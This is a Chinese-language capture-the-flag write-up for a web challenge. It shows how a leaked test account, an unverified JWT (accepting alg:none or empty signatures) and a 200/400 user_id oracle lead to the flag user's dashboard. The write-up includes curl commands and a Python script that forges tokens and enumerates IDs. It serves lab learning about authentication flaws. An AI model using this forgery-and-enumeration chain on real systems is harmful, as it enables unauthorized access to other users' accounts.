## 题解

### 入口与指纹

`Apache/2.4.67 (Debian)`，Trading Platform（与 001/002/003 同族）。
首页注释给账号：

```html
<!-- TODO: Delete the testing account (test:test). -->
```

两步登录：

```bash
POST /                    username=test          -> 302 /password/test
GET  /password/test       隐藏字段 user_id=10032
POST /password/test       username&user_id&password=test -> 302 /dashboard
```

登录后**下发两个 cookie**：

```text
session   = eyJ1c2VyX2lkIjoxMDAzMn0.…（Flask 签名，内容 {"user_id":10032}）
auth_token= eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMi wid
            "user_type":"customer"}…
```

`auth_token` 的 payload 是：

```json
{"username":"test","user_id":10032,"user_type":"customer"}
```

### 关键观察

**1. 只带 `session` 会 500 —— 说明 `auth_token` 是必需的。**

```bash
curl -H 'Cookie: session=<...>' http://$T/dashboard
# 500 Internal Server Error
```

带上两个 cookie 才 200。也就是说 `/dashboard` 会去读 `auth_token`，
缺了它直接抛异常（KeyError 类）。

**2. `auth_token` 的签名根本不校验。**

把 `user_type` 改成 `admin`、签名留空（甚至 `alg: none`）：

```bash
# header {"alg":"none"} + payload {"user_id":10019,"user_type":"customer"} + 空签名
curl -H "Cookie: session=<...>; auth_token=<伪造>" http://$T/dashboard
# 200
```

三种写法都通过：`alg:none`、空签名、随便的假签名。
说明服务端是 `jwt.decode(..., options={"verify_signature": False})` 或等价实现。

**3. `user_id` 会被拿去查库，非法值返回 400。**

```bash
# payload 里 user_id=1
curl … → 400（43 字节）
# payload 里 user_id=10032（test 自己）
curl … → 200 "Welcome, John Doe"
```

于是我可以用这个「200 / 400」当**存在性 oracle**，枚举 `user_id`。

**4. 枚举 `10000`–`10500` 就命中 flag 用户。**

```text
10019 -> Welcome, Flag flag{6b3ec0d7-9484-46e3-a447-822883935c5a}
```

模板把 `first_name` + `last_name` 拼进标题，flag 用户的两个字段就是
`Flag` 和 `flag{...}`。

### 利用链

```bash
T=$(head -1 .target)
c=$(mktemp)

# 1. 正常登录，拿到 session 与 auth_token
curl -sS -c $c -b $c -X POST -d 'username=test' "http://$T/"
curl -sS -c $c -b $c -X POST \
  -d 'username=test&user_id=10032&password=test' "http://$T/password/test"

S=$(grep -oP 'session\t\K[^\t]+' $c)

# 2. 伪造一个不验签的 auth_token，user_id 逐个试
python3 - "$S" <<'PY'
import base64, json, sys, urllib.request
S = sys.argv[1]
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h = b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
for uid in range(10000, 10501):
    p = b64(json.dumps({"username": "test", "user_id": uid, "user_type": "customer"},
                       separators=(",", ":")).encode())
    req = urllib.request.Request("http://$T/dashboard",
        headers={"Cookie": f"session={S}; auth_token={h}.{p}."})
    try:
        body = urllib.request.urlopen(req, timeout=8).read().decode()
    except Exception:
        continue          # 400 = user_id 不存在
    if "flag{" in body:
        print(uid, body.split("Welcome, ")[1].split("<")[0]); break
PY
```

### flag 位置

用户 `id=10019` 的 `first_name` / `last_name` 字段，经 `/dashboard` 的
`Welcome, {{ first_name }} {{ last_name }}` 渲染到页面。

## 复盘

- **一个 500 就暴露了"还有第二个凭据"。** 只带 `session` 拿到 500（不是 302），
  说明服务端在会话之外还读别的 cookie；这比"看文档"更快。
- **JWT 不验签是这类题的高频点。** 判断方法：把 `alg` 改 `none`、把签名字段留空、
  把签名改成 `AAAA`，三种都试一次；只要有一种能过，就能任意改 payload。
- **`user_id` 非法时返回 400，是免费的枚举 oracle。** 先用自己（10032）和
  一个不存在的值（1）确认两种状态，再扫相邻区间。
- **ID 空间按锚点扩。** 已知 `test=10032`，flag 用户在 `10019`（同一量级）。
  扫 500 个值就命中，不需要全量。
- **与 003 的对比**：003 用请求头 `X-UserId` 覆盖身份，027 用不验签的 JWT 覆盖身份；
  两者都是"客户端可决定 user_id"，但**载体不同**，所以探针也不同
  （003 试头名，027 试 JWT 变体）。同族题必须逐关确认载体。
